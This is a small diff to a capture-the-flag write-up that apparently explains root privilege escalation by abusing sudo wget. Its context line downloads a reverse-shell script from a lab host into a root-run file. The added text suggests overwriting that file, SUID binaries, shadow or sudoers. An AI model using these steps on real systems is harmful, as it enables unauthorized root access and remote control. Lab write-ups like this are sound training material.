@@ -207,7 +207,7 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be491ee5-fad3-4815-adee-59400f8fc964)
 
-+ **Alternatively**, try **Overwrite Different SUID Binary**, **Overwrite shadow**, and **Overwrite sudoers** methods.
++ **Alternatively**, the logic here is **overwrite** in the similar way, and hence try them. **Overwrite troll with '/bin/bash' or 'cat /root/root.txt'**, **Overwrite Different SUID Binary**, **Overwrite shadow**, and **Overwrite sudoers** methods.
 + **The logic here is that wget, which works with root privileges, assigns root permissions to the files it downloads.**
 
 # References & Alternatives:
